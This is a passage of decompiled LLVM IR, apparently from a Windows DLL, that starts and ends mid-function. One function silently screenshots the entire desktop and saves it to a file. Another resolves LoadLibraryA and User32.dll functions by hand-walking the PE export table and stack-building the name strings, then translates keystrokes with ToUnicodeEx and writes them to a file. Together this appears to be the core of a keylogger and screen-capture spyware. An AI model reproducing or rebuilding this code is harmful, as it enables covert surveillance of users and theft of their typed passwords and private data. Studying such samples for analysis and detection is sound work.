  %72 = load i16, i16* %71, align 2, !insn.addr !733
  %73 = zext i16 %72 to i32, !insn.addr !733
  %74 = or i32 %63, %73, !insn.addr !733
  store i32 %74, i32* %edx, align 8, !insn.addr !733
  %75 = or i32 %eax.0.reload, 2, !insn.addr !734
  %76 = inttoptr i32 %75 to i16*, !insn.addr !734
  %77 = load i16, i16* %76, align 2, !insn.addr !734
  %78 = icmp eq i16 %72, %77, !insn.addr !734
  %79 = icmp eq i1 %78, false, !insn.addr !735
  store i32 %74, i32* %.reg2mem9, !insn.addr !735
  br i1 %79, label %dec_label_pc_10002386, label %dec_label_pc_1000236e, !insn.addr !735

dec_label_pc_1000236e:                            ; preds = %dec_label_pc_10002364
  %80 = add i32 %ecx.0.reload, 4, !insn.addr !736
  %81 = add i32 %eax.0.reload, 4, !insn.addr !737
  %82 = icmp eq i16 %72, 0, !insn.addr !738
  %83 = icmp eq i1 %82, false, !insn.addr !739
  store i32 %74, i32* %.reg2mem7, !insn.addr !739
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !739
  store i32 %80, i32* %ecx.0.reg2mem, !insn.addr !739
  br i1 %83, label %dec_label_pc_10002357, label %dec_label_pc_100023ad, !insn.addr !739

dec_label_pc_10002386:                            ; preds = %dec_label_pc_10002364, %dec_label_pc_10002357
  %.reload10 = load i32, i32* %.reg2mem9
  %84 = add nuw i32 %esi.0.reload, 1, !insn.addr !740
  %85 = add i32 %edi.0.reload, 76, !insn.addr !741
  %86 = icmp ult i32 %84, %54, !insn.addr !742
  store i32 %.reload10, i32* %.reg2mem, !insn.addr !743
  store i32 %84, i32* %esi.0.reg2mem, !insn.addr !743
  store i32 %85, i32* %edi.0.reg2mem, !insn.addr !743
  br i1 %86, label %dec_label_pc_10002350, label %dec_label_pc_10002399, !insn.addr !743

dec_label_pc_10002399:                            ; preds = %dec_label_pc_10002386, %dec_label_pc_1000232d, %dec_label_pc_1000231d
  %87 = call i32 @"@__security_check_cookie@4"(), !insn.addr !744
  ret i32 %87, !insn.addr !745

dec_label_pc_100023ad:                            ; preds = %dec_label_pc_1000235f, %dec_label_pc_1000236e
  %88 = mul i32 %esi.0.reload, 76, !insn.addr !746
  %89 = add i32 %88, %56, !insn.addr !747
  %90 = inttoptr i32 %89 to i128*, !insn.addr !747
  %91 = load i128, i128* %90, align 4, !insn.addr !747
  %92 = call i128 @__asm_movups.44(i128 %91), !insn.addr !747
  %93 = bitcast i32* %edx to i128*
  %94 = load i128, i128* %93, align 8, !insn.addr !748
  call void @__asm_movups(i128 %94, i128 %92), !insn.addr !748
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !749
  ret i32 %95, !insn.addr !750
}

define i32 @function_100023e0() local_unnamed_addr {
dec_label_pc_100023e0:
  %esi.0.reg2mem = alloca i32, !insn.addr !751
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !751
  %0 = call i128 @__decompiler_undefined_function_4()
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-332 = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-388 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-372 = alloca i32, align 4
  %stack_var_-219 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  store i32 20, i32* %stack_var_-372, align 4, !insn.addr !752
  %5 = call i32* @_memset(i32* nonnull %stack_var_-219, i32 0, i32 99), !insn.addr !753
  %6 = call i32* @_memset(i32* nonnull %stack_var_-116, i32 0, i32 100), !insn.addr !754
  store i32 1852990827, i32* %stack_var_-220, align 4, !insn.addr !755
  %7 = bitcast i32* %stack_var_-220 to i8*
  %8 = call i32* @GetModuleHandleA(i8* nonnull %7), !insn.addr !756
  %9 = ptrtoint i32* %8 to i32, !insn.addr !756
  store i32 1684107084, i32* @global_var_10040fb0, align 4, !insn.addr !757
  store i32 1919052108, i32* @global_var_10040fb4, align 4, !insn.addr !758
  store i32 1098478177, i32* @global_var_10040fb8, align 4, !insn.addr !759
  store i8 0, i8* bitcast (i32* @global_var_10040fbc to i8*), align 4, !insn.addr !760
  %10 = add i32 %9, 60, !insn.addr !761
  %11 = inttoptr i32 %10 to i32*, !insn.addr !761
  %12 = load i32, i32* %11, align 4, !insn.addr !761
  %13 = add i32 %9, 120, !insn.addr !762
  %14 = add i32 %13, %12, !insn.addr !762
  %15 = inttoptr i32 %14 to i32*, !insn.addr !762
  %16 = load i32, i32* %15, align 4, !insn.addr !762
  %17 = add i32 %16, %9, !insn.addr !763
  %18 = call i32 @function_1000b2e0(i32 %9, i32* nonnull @global_var_10040fb0), !insn.addr !764
  %19 = add i32 %17, 36, !insn.addr !765
  %20 = inttoptr i32 %19 to i32*, !insn.addr !765
  %21 = load i32, i32* %20, align 4, !insn.addr !765
  %22 = mul i32 %18, 2, !insn.addr !766
  %23 = add i32 %22, %9, !insn.addr !766
  %24 = add i32 %23, %21, !insn.addr !767
  %25 = inttoptr i32 %24 to i16*, !insn.addr !767
  %26 = load i16, i16* %25, align 2, !insn.addr !767
  %27 = zext i16 %26 to i32, !insn.addr !767
  %28 = add i32 %17, 28, !insn.addr !768
  %29 = inttoptr i32 %28 to i32*, !insn.addr !768
  %30 = load i32, i32* %29, align 4, !insn.addr !768
  %31 = mul i32 %27, 4, !insn.addr !769
  %32 = add i32 %30, %9, !insn.addr !769
  %33 = add i32 %32, %31, !insn.addr !770
  %34 = inttoptr i32 %33 to i32*, !insn.addr !770
  %35 = load i32, i32* %34, align 4, !insn.addr !770
  %36 = add i32 %35, %9, !insn.addr !771
  store i32 1919243093, i32* %stack_var_-116, align 4, !insn.addr !772
  store i32 %36, i32* @global_var_1003fd88, align 4, !insn.addr !773
  %37 = call i32 @function_1000b2e0(i32 %36, i32* bitcast ([14 x i8]* @global_var_1003926c to i32*)), !insn.addr !774
  store i32 1885955143, i32* %stack_var_-116, align 4, !insn.addr !775
  %38 = call i32 @function_1000a260(), !insn.addr !776
  store i32 1, i32* %stack_var_-388, align 4, !insn.addr !777
  %39 = call i32 @GdiplusStartup(i32* nonnull %stack_var_-344, i32* nonnull %stack_var_-388, i32* null), !insn.addr !778
  %40 = call i32* @GetDesktopWindow(), !insn.addr !779
  %41 = call i32* @GetWindowDC(i32* %40), !insn.addr !780
  %42 = sub i32 %3, %4, !insn.addr !781
  store i32 %42, i32* %stack_var_-332, align 4, !insn.addr !782
  %43 = call i32 @GetDeviceCaps(i32* %41, i32 12), !insn.addr !783
  %44 = call i32* @CreateCompatibleDC(i32* %41), !insn.addr !784
  %45 = bitcast i32* %stack_var_-392 to i32**
  store i32 40, i32* %stack_var_-280, align 4, !insn.addr !785
  %46 = bitcast i32* %stack_var_-280 to %__MIDL___MIDL_itf_mfobjects_0000_0008_0002*
  %47 = call i32* @CreateDIBSection(i32* %41, %__MIDL___MIDL_itf_mfobjects_0000_0008_0002* nonnull %46, i32 1, i32** nonnull %45, i32* null, i32 0), !insn.addr !786
  %48 = icmp eq i32* %47, null, !insn.addr !787
  %49 = icmp eq i1 %48, false, !insn.addr !788
  br i1 %49, label %dec_label_pc_100026c4, label %dec_label_pc_1000269a, !insn.addr !788

dec_label_pc_1000269a:                            ; preds = %dec_label_pc_100023e0
  %50 = call i1 @DeleteDC(i32* %44), !insn.addr !789
  %51 = call i1 @DeleteDC(i32* %41), !insn.addr !790
  %52 = call i32 @"@__security_check_cookie@4"(), !insn.addr !791
  ret i32 %52, !insn.addr !792

dec_label_pc_100026c4:                            ; preds = %dec_label_pc_100023e0
  %53 = ptrtoint i32* %47 to i32, !insn.addr !786
  %54 = sub i32 %2, %1, !insn.addr !793
  %55 = call i32 @SaveDC(i32* %44), !insn.addr !794
  %56 = call i32* @SelectObject(i32* %44, i32* %47), !insn.addr !795
  %57 = call i1 @BitBlt(i32* %44, i32 0, i32 0, i32 %42, i32 %54, i32* %41, i32 0, i32 0, i32 13369376), !insn.addr !796
  %58 = call i1 @RestoreDC(i32* %44, i32 %55), !insn.addr !797
  %59 = call i1 @DeleteDC(i32* %44), !insn.addr !798
  %60 = call i1 @DeleteDC(i32* %41), !insn.addr !799
  store i32 16, i32* %stack_var_-544, align 4, !insn.addr !800
  %61 = call i32* @GdipAlloc(i32 16), !insn.addr !801
  %62 = ptrtoint i32* %61 to i32, !insn.addr !801
  store i32 %62, i32* %stack_var_-332, align 4, !insn.addr !802
  %63 = icmp eq i32* %61, null, !insn.addr !803
  store i32* %stack_var_-544, i32** %esp.0.in.reg2mem, !insn.addr !804
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !804
  br i1 %63, label %dec_label_pc_10002758, label %dec_label_pc_10002728, !insn.addr !804

dec_label_pc_10002728:                            ; preds = %dec_label_pc_100026c4
  store i32 ptrtoint (%vtable_10039d30_type* @global_var_10039d30 to i32), i32* %61, align 4, !insn.addr !805
  %64 = bitcast i32* %stack_var_-332 to i32**
  store i32 %53, i32* %stack_var_-556, align 4, !insn.addr !806
  store i32 0, i32* %stack_var_-332, align 4, !insn.addr !807
  %65 = call i32 @GdipCreateBitmapFromHBITMAP(i32* %47, i32* null, i32** nonnull %64), !insn.addr !808
  %66 = add i32 %62, 8, !insn.addr !809
  %67 = inttoptr i32 %66 to i32*, !insn.addr !809
  store i32 %65, i32* %67, align 4, !insn.addr !809
  %68 = load i32, i32* %stack_var_-332, align 4, !insn.addr !810
  %69 = add i32 %62, 4, !insn.addr !811
  %70 = inttoptr i32 %69 to i32*, !insn.addr !811
  store i32 %68, i32* %70, align 4, !insn.addr !811
  store i32* %stack_var_-556, i32** %esp.0.in.reg2mem, !insn.addr !812
  store i32 %62, i32* %esi.0.reg2mem, !insn.addr !812
  br label %dec_label_pc_10002758, !insn.addr !812

dec_label_pc_10002758:                            ; preds = %dec_label_pc_100026c4, %dec_label_pc_10002728
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %71 = call i128 @__asm_movups.44(i128 492561589), !insn.addr !813
  store i32 1, i32* %stack_var_-312, align 4, !insn.addr !814
  call void @__asm_movups(i128 %0, i128 %71), !insn.addr !815
  %72 = call i32 @function_100021c0(i32 4, i32* nonnull %stack_var_-372), !insn.addr !816
  %73 = add i32 %esp.0, -4, !insn.addr !817
  %74 = inttoptr i32 %73 to i32*, !insn.addr !817
  %75 = ptrtoint i32* %stack_var_-312 to i32, !insn.addr !817
  store i32 %75, i32* %74, align 4, !insn.addr !817
  %76 = add i32 %esp.0, -8, !insn.addr !818
  %77 = inttoptr i32 %76 to i32*, !insn.addr !818
  %78 = ptrtoint i32* %stack_var_-328 to i32, !insn.addr !818
  store i32 %78, i32* %77, align 4, !insn.addr !818
  %79 = add i32 %esi.0.reload, 4, !insn.addr !819
  %80 = inttoptr i32 %79 to i32*, !insn.addr !819
  %81 = load i32, i32* %80, align 4, !insn.addr !819
  %82 = add i32 %esp.0, -16, !insn.addr !819
  %83 = inttoptr i32 %82 to i32*, !insn.addr !819
  store i32 %81, i32* %83, align 4, !insn.addr !819
  %84 = call i32 @GdipSaveImageToFile(i32* nonnull @4, i16* bitcast (i32* @4 to i16*), i32* nonnull @4, i32* nonnull @4), !insn.addr !820
  %85 = icmp eq i32 %84, 0, !insn.addr !821
  br i1 %85, label %dec_label_pc_100027c5, label %dec_label_pc_100027be, !insn.addr !822

dec_label_pc_100027be:                            ; preds = %dec_label_pc_10002758
  %86 = add i32 %esi.0.reload, 8, !insn.addr !823
  %87 = inttoptr i32 %86 to i32*, !insn.addr !823
  store i32 %84, i32* %87, align 4, !insn.addr !823
  br label %dec_label_pc_100027c5, !insn.addr !824

dec_label_pc_100027c5:                            ; preds = %dec_label_pc_10002758, %dec_label_pc_100027be
  %88 = add i32 %esp.0, -12, !insn.addr !825
  %89 = inttoptr i32 %88 to i32*, !insn.addr !825
  %90 = add i32 %esp.0, -20, !insn.addr !826
  %91 = inttoptr i32 %90 to i32*, !insn.addr !826
  store i32 1, i32* %91, align 4, !insn.addr !826
  %92 = add i32 %esp.0, -24, !insn.addr !827
  %93 = inttoptr i32 %92 to i32*, !insn.addr !827
  store i32 %53, i32* %93, align 4, !insn.addr !827
  %94 = call i1 @DeleteObject(i32* nonnull @4), !insn.addr !828
  %95 = load i32, i32* %stack_var_-344, align 4, !insn.addr !829
  %96 = add i32 %esp.0, -28, !insn.addr !829
  %97 = inttoptr i32 %96 to i32*, !insn.addr !829
  store i32 %95, i32* %97, align 4, !insn.addr !829
  %98 = call i32 @"@__security_check_cookie@4"(), !insn.addr !830
  ret i32 %98, !insn.addr !831
}

define i32 @function_10002800() local_unnamed_addr {
dec_label_pc_10002800:
  %storemerge.reg2mem = alloca i32, !insn.addr !832
  %edx.0.reg2mem = alloca i32, !insn.addr !832
  %.pre-phi.reg2mem = alloca i32, !insn.addr !832
  %ecx.2.reg2mem = alloca i32, !insn.addr !832
  %ecx.1.reg2mem = alloca i32, !insn.addr !832
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !832
  %ecx.0.reg2mem = alloca i32, !insn.addr !832
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-140 = alloca i128, align 8
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-156 = alloca i16*, align 4
  %1 = call i128 @__decompiler_undefined_function_4()
  %stack_var_-40 = alloca i16*, align 4
  %2 = call i16* @__decompiler_undefined_function_8()
  %stack_var_-4 = alloca i32, align 4
  %3 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !833
  %4 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !834
  %5 = xor i32 %4, %3, !insn.addr !835
  store i32 1919251285, i32* @global_var_10040fb0, align 4, !insn.addr !836
  store i32 1680749107, i32* @global_var_10040fb4, align 4, !insn.addr !837
  store i16 27756, i16* bitcast (i32* @global_var_10040fb8 to i16*), align 4, !insn.addr !838
  store i8 0, i8* bitcast (i32* @global_var_10040fba to i8*), align 4, !insn.addr !839
  %6 = load i128, i128* @global_var_1003a0a0, align 4, !insn.addr !840
  %7 = call i128 @__asm_movaps(i128 %6), !insn.addr !840
  %8 = load i128, i128* bitcast (i32* @global_var_10040fb0 to i128*), align 4, !insn.addr !841
  call void @__asm_movups(i128 %8, i128 %7), !insn.addr !841
  store i32 7827300, i32* @global_var_10040fc0, align 4, !insn.addr !842
  %9 = add i32 %5, 60, !insn.addr !843
  %10 = inttoptr i32 %9 to i32*, !insn.addr !843
  %11 = load i32, i32* %10, align 4, !insn.addr !843
  %12 = add i32 %5, 120, !insn.addr !844
  %13 = add i32 %12, %11, !insn.addr !844
  %14 = inttoptr i32 %13 to i32*, !insn.addr !844
  %15 = load i32, i32* %14, align 4, !insn.addr !844
  %16 = add i32 %15, %5, !insn.addr !845
  %17 = call i32 @function_1000b2e0(i32 %5, i32* nonnull @global_var_10040fb0), !insn.addr !846
  %18 = add i32 %16, 36, !insn.addr !847
  %19 = inttoptr i32 %18 to i32*, !insn.addr !847
  %20 = load i32, i32* %19, align 4, !insn.addr !847
  %21 = mul i32 %17, 2, !insn.addr !848
  %22 = add i32 %21, %5, !insn.addr !848
  %23 = add i32 %22, %20, !insn.addr !849
  %24 = inttoptr i32 %23 to i16*, !insn.addr !849
  %25 = load i16, i16* %24, align 2, !insn.addr !849
  %26 = zext i16 %25 to i32, !insn.addr !849
  %27 = add i32 %16, 28, !insn.addr !850
  %28 = inttoptr i32 %27 to i32*, !insn.addr !850
  %29 = load i32, i32* %28, align 4, !insn.addr !850
  %30 = mul i32 %26, 4, !insn.addr !851
  %31 = add i32 %29, %5, !insn.addr !851
  %32 = add i32 %31, %30, !insn.addr !852
  %33 = inttoptr i32 %32 to i32*, !insn.addr !852
  %34 = load i32, i32* %33, align 4, !insn.addr !852
  %35 = add i32 %34, %5, !insn.addr !853
  %36 = load i128, i128* @global_var_10039f60, align 4, !insn.addr !854
  %37 = call i128 @__asm_movaps(i128 %36), !insn.addr !854
  %38 = load i128, i128* bitcast (i32* @global_var_10040fb0 to i128*), align 4, !insn.addr !855
  call void @__asm_movups(i128 %38, i128 %37), !insn.addr !855
  store i32 1701015410, i32* @global_var_10040fc0, align 4, !insn.addr !856
  store i32 1682535283, i32* @global_var_10040fc4, align 4, !insn.addr !857
  store i8 0, i8* bitcast (i32* @global_var_10040fc8 to i8*), align 4, !insn.addr !858
  store i32 %35, i32* @global_var_100410a4, align 4, !insn.addr !859
  %39 = call i32 @function_1000b2e0(i32 %5, i32* nonnull @global_var_10040fb0), !insn.addr !860
  %40 = call i32 @_malloc(), !insn.addr !861
  %41 = load i128, i128* @global_var_1003a000, align 4, !insn.addr !862
  %42 = call i128 @__asm_movaps(i128 %41), !insn.addr !862
  store i8 0, i8* bitcast (i32* @global_var_10040fc0 to i8*), align 4, !insn.addr !863
  %43 = load i128, i128* bitcast (i32* @global_var_10040fb0 to i128*), align 4, !insn.addr !864
  call void @__asm_movups(i128 %43, i128 %42), !insn.addr !864
  %44 = call i32 @function_1000a260(), !insn.addr !865
  %45 = load i128, i128* @global_var_1003a120, align 4, !insn.addr !866
  %46 = call i128 @__asm_movaps(i128 %45), !insn.addr !866
  store i16 116, i16* bitcast (i32* @global_var_10040fc0 to i16*), align 4, !insn.addr !867
  %47 = load i128, i128* bitcast (i32* @global_var_10040fb0 to i128*), align 4, !insn.addr !868
  call void @__asm_movups(i128 %47, i128 %46), !insn.addr !868
  %48 = call i32 @function_1000a260(), !insn.addr !869
  %49 = call i128 @__asm_xorps(i128 %46, i128 %46), !insn.addr !870
  %sext = mul i32 %0, 65536
  %50 = sdiv i32 %sext, 65536, !insn.addr !871
  %51 = ptrtoint i16* %2 to i32
  %52 = zext i32 %51 to i128, !insn.addr !872
  call void @__asm_movups(i128 %52, i128 %49), !insn.addr !872
  call void @__asm_movups(i128 %1, i128 %49), !insn.addr !873
  %53 = call i32 @MapVirtualKeyExW(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !874
  %54 = inttoptr i32 %53 to i16*, !insn.addr !875
  store i16* %54, i16** %stack_var_-156, align 4, !insn.addr !875
  %55 = bitcast i16** %stack_var_-40 to i16*
  %56 = inttoptr i32 %40 to i8*, !insn.addr !876
  %57 = inttoptr i32 %48 to i32*, !insn.addr !877
  %58 = call i32 @ToUnicodeEx(i32 %53, i32 %50, i8* %56, i16* nonnull %55, i32 16, i32 0, i32* %57), !insn.addr !877
  store i32 16, i32* %stack_var_-236, align 4, !insn.addr !878
  %59 = trunc i32 %58 to i16, !insn.addr !879
  %60 = icmp eq i16 %59, 0, !insn.addr !879
  store i32* %stack_var_-236, i32** %esp.0.in.reg2mem, !insn.addr !880
  br i1 %60, label %dec_label_pc_10002a35, label %dec_label_pc_100029ca, !insn.addr !880

dec_label_pc_100029ca:                            ; preds = %dec_label_pc_10002800
  %61 = call i128 @__asm_movaps(i128 7368320664886723658192474275931), !insn.addr !881
  %62 = load i128, i128* %stack_var_-140, align 8, !insn.addr !882
  call void @__asm_movups(i128 %62, i128 %61), !insn.addr !882
  %63 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !883
  %64 = ptrtoint i32* %63 to i32, !insn.addr !883
  %65 = ptrtoint i128* %stack_var_-140 to i32, !insn.addr !884
  store i32 %64, i32* @global_var_1003e9c0, align 4, !insn.addr !885
  store i32 %65, i32* %ecx.0.reg2mem, !insn.addr !886
  br label %dec_label_pc_10002a05, !insn.addr !886

dec_label_pc_10002a05:                            ; preds = %dec_label_pc_10002a05, %dec_label_pc_100029ca
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %66 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !887
  %67 = load i16, i16* %66, align 2, !insn.addr !887
  %68 = add i32 %ecx.0.reload, 2, !insn.addr !888
  %69 = icmp eq i16 %67, 0, !insn.addr !889
  %70 = icmp eq i1 %69, false, !insn.addr !890
  store i32 %68, i32* %ecx.0.reg2mem, !insn.addr !890
  br i1 %70, label %dec_label_pc_10002a05, label %dec_label_pc_10002a10, !insn.addr !890

dec_label_pc_10002a10:                            ; preds = %dec_label_pc_10002a05
  %71 = ptrtoint i32* %stack_var_-138 to i32, !insn.addr !891
  %72 = sub i32 %68, %71, !insn.addr !892
  %73 = bitcast i128* %stack_var_-140 to i32*, !insn.addr !893
  %74 = call i1 @WriteFile(i32* %63, i32* nonnull %73, i32 %72, i32* nonnull @global_var_100410a0, %_OVERLAPPED* null), !insn.addr !893
  %75 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !894
  store i32 %75, i32* %stack_var_-288, align 4, !insn.addr !894
  %76 = inttoptr i32 %75 to i32*, !insn.addr !895
  %77 = call i1 @CloseHandle(i32* %76), !insn.addr !895
  store i32* %stack_var_-288, i32** %esp.0.in.reg2mem, !insn.addr !895
  br label %dec_label_pc_10002a35, !insn.addr !895

dec_label_pc_10002a35:                            ; preds = %dec_label_pc_10002a10, %dec_label_pc_10002800
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %78 = icmp eq i32 %58, 0, !insn.addr !896
  %79 = add i32 %esp.0, -4, !insn.addr !897
  %80 = inttoptr i32 %79 to i32*, !insn.addr !897
  store i32 0, i32* %80, align 4, !insn.addr !897
  %81 = add i32 %esp.0, -8, !insn.addr !898
  %82 = inttoptr i32 %81 to i32*, !insn.addr !898
  store i32 128, i32* %82, align 4, !insn.addr !898
  %83 = add i32 %esp.0, -12, !insn.addr !899
  %84 = inttoptr i32 %83 to i32*, !insn.addr !899
  store i32 4, i32* %84, align 4, !insn.addr !899
  %85 = add i32 %esp.0, -16, !insn.addr !900
  %86 = inttoptr i32 %85 to i32*, !insn.addr !900
  store i32 0, i32* %86, align 4, !insn.addr !900
  %87 = add i32 %esp.0, -20, !insn.addr !901
  %88 = inttoptr i32 %87 to i32*, !insn.addr !901
  store i32 1, i32* %88, align 4, !insn.addr !901
  %89 = add i32 %esp.0, -24, !insn.addr !902
  %90 = inttoptr i32 %89 to i32*, !insn.addr !902
  store i32 4, i32* %90, align 4, !insn.addr !902
  %91 = add i32 %esp.0, -28, !insn.addr !903
  %92 = inttoptr i32 %91 to i32*, !insn.addr !903
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %92, align 4, !insn.addr !903
  br i1 %78, label %dec_label_pc_10002a7d, label %dec_label_pc_10002a52, !insn.addr !904

dec_label_pc_10002a52:                            ; preds = %dec_label_pc_10002a35
  %93 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !905
  %94 = ptrtoint i32* %93 to i32, !insn.addr !905
  %95 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %94, i32* @global_var_1003e9c0, align 4, !insn.addr !906
  store i32 %95, i32* %ecx.1.reg2mem, !insn.addr !907
  br label %dec_label_pc_10002a62, !insn.addr !907

dec_label_pc_10002a62:                            ; preds = %dec_label_pc_10002a62, %dec_label_pc_10002a52
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %96 = inttoptr i32 %ecx.1.reload to i16*, !insn.addr !908
  %97 = load i16, i16* %96, align 2, !insn.addr !908
  %98 = add i32 %ecx.1.reload, 2, !insn.addr !909
  %99 = icmp eq i16 %97, 0, !insn.addr !910
  %100 = icmp eq i1 %99, false, !insn.addr !911
  store i32 %98, i32* %ecx.1.reg2mem, !insn.addr !911
  br i1 %100, label %dec_label_pc_10002a62, label %dec_label_pc_10002a6d, !insn.addr !911

dec_label_pc_10002a6d:                            ; preds = %dec_label_pc_10002a62
  %101 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !907
  %102 = sub i32 %98, %101, !insn.addr !912
  %103 = add i32 %esp.0, -32, !insn.addr !913
  %104 = inttoptr i32 %103 to i32*, !insn.addr !913
  store i32 0, i32* %104, align 4, !insn.addr !913
  %105 = add i32 %esp.0, -36, !insn.addr !914
  %106 = inttoptr i32 %105 to i32*, !insn.addr !914
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %106, align 4, !insn.addr !914
  %107 = add i32 %esp.0, -40, !insn.addr !915
  %108 = inttoptr i32 %107 to i32*, !insn.addr !915
  store i32 %102, i32* %108, align 4, !insn.addr !915
  store i32 %95, i32* %.pre-phi.reg2mem, !insn.addr !916
  store i32 %94, i32* %edx.0.reg2mem, !insn.addr !916
  store i32 %107, i32* %storemerge.reg2mem, !insn.addr !916
  br label %dec_label_pc_10002ab0, !insn.addr !916

dec_label_pc_10002a7d:                            ; preds = %dec_label_pc_10002a35
  %109 = load i16*, i16** %stack_var_-156, align 4
  %110 = ptrtoint i16* %109 to i32
  %111 = bitcast i16** %stack_var_-40 to i32*
  store i32 %110, i32* %111, align 4
  %112 = call i32* @CreateFileW(i16* %109, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !917
  %113 = ptrtoint i32* %112 to i32, !insn.addr !917
  %114 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %113, i32* @global_var_1003e9c0, align 4, !insn.addr !918
  store i32 %114, i32* %ecx.2.reg2mem, !insn.addr !919
  br label %dec_label_pc_10002a96, !insn.addr !919

dec_label_pc_10002a96:                            ; preds = %dec_label_pc_10002a96, %dec_label_pc_10002a7d
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %115 = inttoptr i32 %ecx.2.reload to i16*, !insn.addr !920
  %116 = load i16, i16* %115, align 2, !insn.addr !920
  %117 = add i32 %ecx.2.reload, 2, !insn.addr !921
  %118 = icmp eq i16 %116, 0, !insn.addr !922
  %119 = icmp eq i1 %118, false, !insn.addr !923
  store i32 %117, i32* %ecx.2.reg2mem, !insn.addr !923
  br i1 %119, label %dec_label_pc_10002a96, label %dec_label_pc_10002aa1, !insn.addr !923

dec_label_pc_10002aa1:                            ; preds = %dec_label_pc_10002a96
  %120 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !919
  %121 = sub i32 %117, %120, !insn.addr !924
  %122 = add i32 %esp.0, -32, !insn.addr !925
  %123 = inttoptr i32 %122 to i32*, !insn.addr !925
  store i32 0, i32* %123, align 4, !insn.addr !925
  %124 = add i32 %esp.0, -36, !insn.addr !926
  %125 = inttoptr i32 %124 to i32*, !insn.addr !926
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %125, align 4, !insn.addr !926
  %126 = add i32 %esp.0, -40, !insn.addr !927
  %127 = inttoptr i32 %126 to i32*, !insn.addr !927
  store i32 %121, i32* %127, align 4, !insn.addr !927
  store i32 %114, i32* %.pre-phi.reg2mem, !insn.addr !927
  store i32 %113, i32* %edx.0.reg2mem, !insn.addr !927
  store i32 %126, i32* %storemerge.reg2mem, !insn.addr !927
  br label %dec_label_pc_10002ab0, !insn.addr !927

dec_label_pc_10002ab0:                            ; preds = %dec_label_pc_10002aa1, %dec_label_pc_10002a6d
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %128 = add i32 %storemerge.reload, -4, !insn.addr !928
  %129 = inttoptr i32 %128 to i32*, !insn.addr !928
  store i32 %.pre-phi.reload, i32* %129, align 4, !insn.addr !928
  %130 = add i32 %storemerge.reload, -8, !insn.addr !929
  %131 = inttoptr i32 %130 to i32*, !insn.addr !929
  store i32 %edx.0.reload, i32* %131, align 4, !insn.addr !929
  %132 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !930
  %133 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !931
  %134 = add i32 %storemerge.reload, -12, !insn.addr !931
  %135 = inttoptr i32 %134 to i32*, !insn.addr !931
  store i32 %133, i32* %135, align 4, !insn.addr !931
  %136 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !932
  %137 = add i32 %storemerge.reload, -16, !insn.addr !933
  %138 = inttoptr i32 %137 to i32*, !insn.addr !933
  store i32 %40, i32* %138, align 4, !insn.addr !933
  %139 = call i32 @_free(), !insn.addr !934
  %140 = call i32 @"@__security_check_cookie@4"(), !insn.addr !935
  ret i32 %140, !insn.addr !936
}

define i32 @function_10002ae0() local_unnamed_addr {
dec_label_pc_10002ae0:
  %esp.0.be.reg2mem = alloca i32, !insn.addr !937
